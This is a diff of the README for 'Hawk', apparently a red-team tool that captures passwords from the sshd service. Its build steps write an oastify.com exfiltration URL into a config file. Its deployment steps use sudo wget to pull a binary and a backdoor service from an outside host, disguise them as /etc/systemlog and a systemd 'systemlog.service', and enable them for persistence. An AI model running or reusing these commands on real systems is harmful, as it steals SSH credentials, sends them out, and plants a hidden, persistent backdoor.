@@ -9,11 +9,15 @@ Hawk is a simple tool designed to monitor the sshd service for passwords being s
 ## Building for server
 
 ```bash
-git clone https://github.com/MattKeeley/hawk.git
+git clone https://github.com/MattKeeley/hawk.git &&
 cd hawk
+
+
 echo "http://bq5j88gurv5ohn0qyxa02jii3990xulj.oastify.com" > exfil_location
-go build -o hawk
-cp hawk /home/ubuntu/webserver
+
+
+go build -o hawk &&
+cp hawk /home/ubuntu/webserver &&
 cp hawk_backdoor /home/ubuntu/webserver
 ```
 
@@ -21,6 +25,7 @@ cp hawk_backdoor /home/ubuntu/webserver
 
 ```bash
  sudo ls /etc/systemlog || sudo wget http://redteam.prodefense.io:1337/hawk -O /etc/systemlog > /dev/null 2>&1
+ sudo chmod +x /etc/systemlog
  sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
  sudo systemctl start systemlog.service
  sudo systemctl enable systemlog.service
